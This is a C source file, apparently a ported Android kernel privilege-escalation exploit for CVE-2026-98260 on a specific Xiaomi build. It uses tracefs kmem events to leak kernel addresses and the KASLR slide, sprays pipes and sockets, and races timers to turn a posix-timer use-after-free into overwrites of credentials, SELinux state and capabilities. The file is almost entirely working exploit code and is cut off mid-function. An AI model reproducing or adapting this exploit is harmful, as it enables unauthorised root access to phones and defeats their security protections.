/* Park a CVE-2026-98260 zombie, reclaim its timer page with the pipe+AIO
 * path, plant an rb node, and reap. Fail closed: no waitpid unless the
 * filemap line count proves which ring owns the node page.
 *
 * PORT NOTE (madrid / Xiaomi 18 Pro Max, g284297031c53):
 *   All per-build numbers moved into pc98260_target.h. The logic below is
 *   unchanged from xiaomi9pmroot/uaf_plant_v6.c except where marked
 *   "PORT:" — those are the two places where this build differs:
 *     1. alloc_posix_timer is INLINED, so its call site lives in
 *        do_timer_create; the address comes from the header either way.
 *     2. task_struct slab objsize is 5760 while sizeof() is 4736; the
 *        filter uses the slab value.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"

#include "pc98260_target.h"

extern char **environ;

/* PORT: every per-build constant now comes from pc98260_target.h. The old
 * names are kept so the body of this file stays byte-identical to v6. */
#define PAGE_OFFSET   GEOM_PAGE_OFFSET
#define TIMER_LINK    LINK_ALLOC_TIMER
#define CRED_LINK     LINK_ALLOC_CRED
#define SELINUX_LINK  LINK_SELINUX_STATE
#define LINK_USER_NS  LINK_INIT_USER_NS
#define LINK_GROUPS   LINK_INIT_GROUPS
#define LINK_UCOUNTS  LINK_INIT_UCOUNTS
#define FULLCAP       CAP_FULL

int pc98260_run_rootd(void);

static uint64_t g_slide = 0;
static uint64_t g_memstart_pfn = GEOM_MEMSTART_PFN;

static int g_no_real_cred;      /* retained for CLI compatibility; always real-cred */
static int g_no_selftest;       /* --no-selftest  */
static uint64_t g_task_obj = GEO_TASK_OBJSIZE;  /* 可被 slabinfo 覆盖 */
static uint64_t g_cred_site;                    /* LINK_ALLOC_CRED+slide */
static int g_selftest_cred;                     /* 自检看到的 cred 分配数 */
static time_t g_deadline;                       /* 预算看门狗 */

static int past_deadline(void)
{
	return g_deadline && time(NULL) > g_deadline;
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
#define KITIMER_NODE  GEO_KITIMER_IT
/* One UAF is enough. posix_cpu_timers_exit() drains three rb trees in a row --
   CPUCLOCK_PROF, VIRT, SCHED -- and each tree's leftmost node is an object we
   own once the slab is reclaimed. Arming one timer per base inside a single
   8 KB slab therefore turns one reclaim into three independent rb_erase()
   calls, each with its own parent/value pair taken straight from our page. */
#define TILE_NONE 0
#define TILE_CRED 1
#define TILE_SELINUX 2
#define TILE_CRED2 3   /* PLANT_PTR: write stale node addr A into cap_effective */
static timer_t g_tids[16000];
#define MAX_VICTIMS 16
#define VICTIM_TIMERS 2048
static int g_timer_count = 16000;
static int g_child_cpu = 1;
static int g_victim_cpu = -1;
static uint64_t g_victim_ptrs[MAX_VICTIMS][VICTIM_TIMERS];
static int g_victim_n[MAX_VICTIMS];
static int g_tile_kind[3];
static unsigned g_tile_off[3];
static int g_bases[3];
static int g_tiles_on;
static int g_cap_mode;   /* real-cred KSU: PLANT_PTR cap_effective pass */
static int g_want_cap;   /* combine uid0 + SELinux + cap in one reclaim */

static clockid_t thread_clock(int base)
{
	/* MAKE_THREAD_CPUCLOCK(gettid(), base) with CPUCLOCK_PERTHREAD_MASK set:
	   base 0 = PROF, 1 = VIRT, 2 = SCHED. Without the 4 bit the kernel decodes
	   the id as a *group* clock and rejects a non-leader tid with EINVAL. */
	pid_t tid = (pid_t)syscall(SYS_gettid);
	return (clockid_t)((~(long)tid << 3) | 4 | base);
}
#define NFILL 42
#define NFLUSH 2048
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#define F_SETPIPE_SZ 1031
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	atomic_int arm_ready;
	int arm_idx[3];
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[16000];
static int g_all_n;
static int g_pipes[MAX_PIPES][2];
static int g_npipes;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}


/*
 * memstart_addr is not a compile-time constant on arm64: it is the physical
 * base of the linear map and is relocated at boot.  BRM's adaptation notes
 * explicitly warn that MEMSTART_PFN must come from /proc/iomem.  Use the
 * lowest System RAM start; fall back to the static header value if the file
 * is unreadable or contains only masked zeros.
 */
static int detect_memstart_pfn(void)
{
	FILE *f = fopen("/proc/iomem", "r");
	char line[256];
	unsigned long long best = ~0ULL;
	int best_zero = 0;
	if (!f) {
		dprintf(STDOUT_FILENO, "[mem] /proc/iomem unavailable errno=%d static_pfn=%#" PRIx64 "\n",
			errno, g_memstart_pfn);
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		unsigned long long start = 0, end = 0;
		char rest[200] = {0};
		if (sscanf(line, "%llx-%llx : %199[^\n]", &start, &end, rest) != 3)
			continue;
		if (!strstr(rest, "System RAM"))
			continue;
		if (start == 0) {
			best_zero = 1;
			continue;
		}
		if ((start & 0xfff) == 0 && start < best)
			best = start;
	}
	fclose(f);
	if (best == ~0ULL) {
		if (best_zero)
			dprintf(STDOUT_FILENO,
				"[mem] iomem only zero System RAM; keeping static_pfn=%#" PRIx64 "\n",
				g_memstart_pfn);
		else
			dprintf(STDOUT_FILENO,
				"[mem] no usable System RAM in iomem; keeping static_pfn=%#" PRIx64 "\n",
				g_memstart_pfn);
		return -1;
	}
	uint64_t pfn = (uint64_t)(best >> 12);
	if (pfn != g_memstart_pfn) {
		dprintf(STDOUT_FILENO,
			"[mem] memstart corrected static=%#" PRIx64 " -> iomem=%#" PRIx64
			" phys=%#llx\n", g_memstart_pfn, pfn, best);
		g_memstart_pfn = pfn;
	} else {
		dprintf(STDOUT_FILENO,
			"[mem] memstart verified pfn=%#" PRIx64 " phys=%#llx\n",
			g_memstart_pfn, best);
	}
	return 0;
}

static uint64_t object_pfn_offset(uint64_t ptr)
{
	/* Direct-map VA -> linear-map page offset (not the physical PFN). */
	return ((ptr & ~UINT64_C(0xfff)) - PAGE_OFFSET) >> 12;
}

static uint64_t object_pfn(uint64_t ptr)
{
	/* /proc/iomem and trace mm_page_free use the physical PFN.  memstart is
	 * the physical base of the linear map on arm64. */
	return object_pfn_offset(ptr) + g_memstart_pfn;
}

static uint64_t g_watch[36000];
static int g_nwatch;

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static void build_watch(void)
{
	int w = 0;
	g_nwatch = 0;
	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
		g_watch[g_nwatch++] = object_pfn(g_all[i] + KITIMER_NODE);
		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
	}
	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
	for (int i = 0; i < g_nwatch; i++) {
		if (w && g_watch[w - 1] == g_watch[i])
			continue;
		g_watch[w++] = g_watch[i];
	}
	g_nwatch = w;
}

static int watch_has(uint64_t pfn)
{
	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
}

static int cpu_count(void);

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

/* 单次调用最多扫多少字节的 trace 文本。
 *
 * PORT (2026-10-26): 原来这里无界扫描 per_cpu/cpuN/trace 全文，而回收阶段
 * buffer 被设成 512 MB，外层还要循环 20 次 —— 于是"等 page_freed"退化成
 * 扫几百 MB 文本，进程 R 态烧 CPU 几十分钟，看起来像卡死（实测 run10/run20）。
 * 加预算后单次成本有上界；扫不到就返回 0，由外层按"page miss, retry"处理，
 * 语义不变（漏检只是多试一个 triple，比卡死划算得多）。 */
#define TRACE_SCAN_BUDGET (16U << 20)

/* The interesting event is the newest one.  Reading from the beginning of a
 * multi-megabyte per-CPU ring with a small budget hides it behind churn noise;
 * seek to the tail instead. */
static void seek_trace_tail(FILE *file)
{
	if (fseek(file, 0, SEEK_END) != 0)
		return;
	long size = ftell(file);
	if (size <= 0)
		return;
	long start = size > (long)TRACE_SCAN_BUDGET
		? size - (long)TRACE_SCAN_BUDGET : 0;
	if (fseek(file, start, SEEK_SET) != 0)
		return;
	if (start > 0) {
		char skip[768];
		(void)fgets(skip, sizeof(skip), file);
	}
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	/* Per-CPU budget: a busy CPU0 must not consume the scan window before
	 * the victim CPU that actually carries the timer free is read. */
	for (int k = 0; k < ncpu; k++) {
		int cpu = g_victim_cpu >= 0
			? (g_victim_cpu + k) % ncpu : k;
		size_t budget = TRACE_SCAN_BUDGET;
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		seek_trace_tail(file);
		while (fgets(line, sizeof(line), file)) {
			size_t used = strlen(line);
			if (used >= budget)
				break;
			budget -= used;
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

static uint64_t parse_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	if (!p)
		return UINT64_MAX;
	return strtoull(p + 6, NULL, 16);
}

struct page_free_info {
	int found;
	uint64_t pfn;
	int order;
	int cpu;
};

static int line_order(const char *line)
{
	const char *p = strstr(line, "order=");
	if (!p)
		return -1;
	return (int)strtoul(p + 6, NULL, 10);
}

/* Find a page_free event for the victim slab.
 *  - order=1: base pfn matches the order-1 slab;
 *  - order=0: only accept the 4K half that actually contains the stale node.
 * A bounded text-trace scan; a miss is a retry, never a hang. */
static uint64_t g_alt_pfn = UINT64_MAX;

static int find_page_free(uint64_t base, uint64_t want_half,
			  struct page_free_info *out)
{
	int ncpu = cpu_count();
	uint64_t want_alt = (g_alt_pfn != UINT64_MAX && want_half >= base)
		? g_alt_pfn + (want_half - base) : UINT64_MAX;
	memset(out, 0, sizeof(*out));
	for (int k = 0; k < ncpu; k++) {
		int cpu = g_victim_cpu >= 0
			? (g_victim_cpu + k) % ncpu : k;
		size_t budget = TRACE_SCAN_BUDGET;
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		seek_trace_tail(file);
		while (fgets(line, sizeof(line), file)) {
			size_t used = strlen(line);
			uint64_t pfn;
			int order;
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (!strstr(line, "mm_page_free:"))
				continue;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX ||
			    (pfn != base && pfn != base + 1 &&
			     (g_alt_pfn == UINT64_MAX || (pfn != g_alt_pfn && pfn != g_alt_pfn + 1))))
				continue;
			order = line_order(line);
			if (order < 0)
				continue;
			if (order == 0 && pfn != want_half && pfn != want_alt)
				continue;
			if (order > 1) {
				dprintf(STDOUT_FILENO,
					"[pagefree] target pfn=%#" PRIx64 " order=%d cpu=%d (not accepted)\n",
					pfn, order, cpu);
				continue;
			}
			out->found = 1;
			out->pfn = pfn;
			out->order = order;
			out->cpu = cpu;
			fclose(file);
			return 1;
		}
		fclose(file);
	}
	return 0;
}

/* Was the target pfn allocated (0/1 order) during the reclaim window? */
static int find_page_alloc(uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int k = 0; k < ncpu; k++) {
		int cpu = g_victim_cpu >= 0
			? (g_victim_cpu + k) % ncpu : k;
		size_t budget = TRACE_SCAN_BUDGET;
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		seek_trace_tail(file);
		while (fgets(line, sizeof(line), file)) {
			size_t used = strlen(line);
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			uint64_t got = parse_pfn(line);
			if (got != pfn && (g_alt_pfn == UINT64_MAX || got != g_alt_pfn))
				continue;
			fclose(file);
			return 1;
		}
		fclose(file);
	}
	return 0;
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int g_socks[256][2];
static int g_nsocks;

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static unsigned long drain_socks(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x42, sizeof(buf));
	g_nsocks = 0;
	for (int i = 0; i < 256 && total < (4UL << 30); i++) {
		int sz = 16 << 20;
		int wrote = 0;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]))
			break;
		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		while (wrote < (16 << 20)) {
			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
			if (n < 0)
				break;
			wrote += (int)n;
		}
		if (!wrote) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		total += (unsigned long)wrote;
		g_nsocks++;
	}
	dprintf(STDOUT_FILENO, "[sock] pairs=%d MiB=%lu\n", g_nsocks, total >> 20);
	return total;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static unsigned long drain_pipes(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x41, sizeof(buf));
	g_npipes = 0;
	int cpus = cpu_count();
	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
		int cap, wrote = 0;
		pin_cpu(i % cpus);
		if (pipe(g_pipes[i]))
			break;
		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
		if (cap < 0)
			cap = 65536;
		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_pipes[i][0]);
			close(g_pipes[i][1]);
			break;
		}
		while (wrote < cap) {
			size_t chunk = sizeof(buf);
			ssize_t n;
			if (chunk > (size_t)(cap - wrote))
				chunk = (size_t)(cap - wrote);
			n = write(g_pipes[i][1], buf, chunk);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				close(g_pipes[i][0]);
				close(g_pipes[i][1]);
				dprintf(STDOUT_FILENO, "[drain] write errno=%d\n", errno);
				return total;
			}
			wrote += (int)n;
			total += (unsigned long)n;
		}
		g_npipes++;
	}
	dprintf(STDOUT_FILENO, "[drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
	return total;
}

static int read_raw_cpu(int cpu, uint8_t *buf, size_t cap, size_t *used, size_t limit)
{
	char path[128];
	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
	int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget;
	if (fd < 0)
		return -1;
	/* poll() on trace_pipe_raw is not trustworthy, and a blocking read costs
	   the whole alarm budget. Spin on EAGAIN with a 1 ms nap instead: the
	   records are already in the ring buffer by the time we get here. */
	budget = limit ? 120 : 150;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) {
			*used += (size_t)n;
			if (limit && *used >= limit)
				break;
			budget = limit ? 120 : 150;
			continue;
		}
		if (n == 0)
			break;
		if (errno != EAGAIN && errno != EINTR) {
			close(fd);
			return -1;
		}
		usleep(1000);
	}
	close(fd);
	return 0;
}

static int read_raw(uint8_t *buf, size_t cap, size_t *used, size_t limit)
{
	return read_raw_cpu(0, buf, cap, used, limit);
}


static void dump_timer_trace_debug(void)
{
	FILE *f = fopen(TRACE "/trace", "r");
	if (!f) {
		dprintf(STDOUT_FILENO, "[timer-debug] trace open errno=%d\n", errno);
		return;
	}
	char line[768];
	int shown = 0, kmem = 0;
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, "kmem_cache_alloc"))
			kmem++;
		if (shown < 12 &&
		    (strstr(line, "do_timer_create") ||
		     strstr(line, "bytes_req=384"))) {
			dprintf(STDOUT_FILENO, "[timer-debug] %s", line);
			shown++;
		}
		if (shown >= 12 && kmem > 1000)
			break;
	}
	fclose(f);
	dprintf(STDOUT_FILENO, "[timer-debug] kmem_lines=%d matched=%d\n", kmem, shown);
	if (!shown)
		dprintf(STDOUT_FILENO, "[timer-debug] no do_timer_create/bytes_req=384 lines\n");
}


/* g928's kmem_cache_alloc trace record inserts a "name" pointer:
 *   call_site +0, ptr +8, name +16, bytes_req +24, bytes_alloc +32
 * Older 6.12/6.6 builds use:
 *   call_site +0, ptr +8, bytes_req +16, bytes_alloc +24
 * Accept both layouts instead of silently filtering every g928 timer.
 */
static uint64_t kmem_event_req(const uint8_t *p, size_t remain)
{
	uint64_t r16 = 0, r24 = 0;
	if (remain >= 24)
		memcpy(&r16, p + 16, 8);
	if (remain >= 32)
		memcpy(&r24, p + 24, 8);
	if (r16 == GEO_KITIMER_SIZE)
		return r16;
	if (r24 == GEO_KITIMER_SIZE)
		return r24;
	return 0;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(TIMER_LINK);
	int fd, n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	*chosen = 0;
	dprintf(STDOUT_FILENO, "[timer-debug] expected_site=%#" PRIx64
		" no_slide=%#" PRIx64 " slide=%#" PRIx64 "\n",
		site, (uint64_t)TIMER_LINK, g_slide);
	/* trace_pipe_raw consumes the ring; snapshot the human-readable trace
	 * first, otherwise the diagnostic is always empty. */
	dump_timer_trace_debug();
	int ncpu = cpu_count();
	for (int c = 0; c < ncpu; c++) {
		if (read_raw_cpu(c, buf, 8U << 20, &used, 0)) {
			free(buf);
			return -1;
		}
	}
	fd = 0; /* the shared reader owns the fd now */
	int raw_hits = 0, raw_m4 = 0, raw_p4 = 0, raw_noslide = 0;
	uint64_t no_slide = (uint64_t)TIMER_LINK;
	uint64_t site_m4 = site - 4, site_p4 = site + 4;
	for (size_t i = 0; i + 8 <= used; i++) {
		if (!memcmp(buf + i, &site, 8)) raw_hits++;
		if (!memcmp(buf + i, &site_m4, 8)) raw_m4++;
		if (!memcmp(buf + i, &site_p4, 8)) raw_p4++;
		if (!memcmp(buf + i, &no_slide, 8)) raw_noslide++;
	}
	dprintf(STDOUT_FILENO,
		"[timer-debug] raw_hits site=%d m4=%d p4=%d noslide=%d\n",
		raw_hits, raw_m4, raw_p4, raw_noslide);
	/* KASLR slide is 2 MiB aligned, so do_timer_create+0xb8 keeps
	 * low 12 bits = 0x05c.  Recover actual call_site candidates from raw. */
	int cand = 0;
	for (size_t i = 0; i + 8 <= used && cand < 8; i++) {
		uint64_t v;
		memcpy(&v, buf + i, 8);
		if ((v & 0xfff) != 0x05c || (v >> 48) != 0xffff)
			continue;
		dprintf(STDOUT_FILENO,
			"[timer-debug] raw_candidate=%#" PRIx64 " delta=%#" PRIx64 "\n",
			v, v - (uint64_t)TIMER_LINK);
		cand++;
	}
	dprintf(STDOUT_FILENO, "[timer-debug] raw_candidates=%d\n", cand);
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		req = kmem_event_req(buf + i, used - i);
		if (got != site || !req || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	if (!n) {
		int near = 0;
		for (size_t i = 0; i + 32 <= used && near < 8; i++) {
			uint64_t got, ptr, req;
			req = kmem_event_req(buf + i, used - i);
			if (!req)
				continue;
			memcpy(&got, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			if ((got >> 48) != 0xffff || (ptr >> 48) != 0xffff)
				continue;
			dprintf(STDOUT_FILENO,
				"[timer-debug] near req=%#" PRIx64 " site=%#" PRIx64 " ptr=%#" PRIx64 "\n",
				req, got, ptr);
			near++;
		}
	}
	free(buf);
	*count = n;
	g_all_n = n;
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used, 0)) {
		free(buf);
		return -1;
	}
	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		if (got != site || req != bytes)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		ptrs[n++] = ptr;
	}
	free(buf);
	return n;
}

/* g928 trace records may contain an extra name pointer, so recognize both
 * kmem layouts instead of assuming bytes_req is always at +16. */
static int collect_site_pid(uint64_t site, uint64_t bytes, int want_pid,
			    uint64_t *ptrs, int cap, int *n_seen)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0, seen = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used, 0)) {
		free(buf);
		return -1;
	}
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t got, ptr, req16 = 0, req24 = 0;
		uint32_t pid;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req16, buf + i + 16, 8);
		if (i + 32 <= used)
			memcpy(&req24, buf + i + 24, 8);
		/* Older layout: bytes_req at +16. g928: name at +16 and
		 * bytes_req at +24. Accept the requested size in either slot. */
		if (got != site || (req16 != bytes && req24 != bytes))
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		seen++;
		if (want_pid >= 0) {
			if (i < 4)
				continue;
			memcpy(&pid, buf + i - 4, 4);
			if ((int)pid != want_pid)
				continue;
		}
		if (n < cap)
			ptrs[n++] = ptr;
	}
	free(buf);
	if (n_seen)
		*n_seen = seen;
	return n;
}

static int text_has_comm(const char *comm)
{
	FILE *file = fopen(CPU0_TRACE, "r");
	char line[768];
	int n = 0;
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, "do_timer_create") && strstr(line, comm))
			n++;
	}
	fclose(file);
	return n;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t id;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
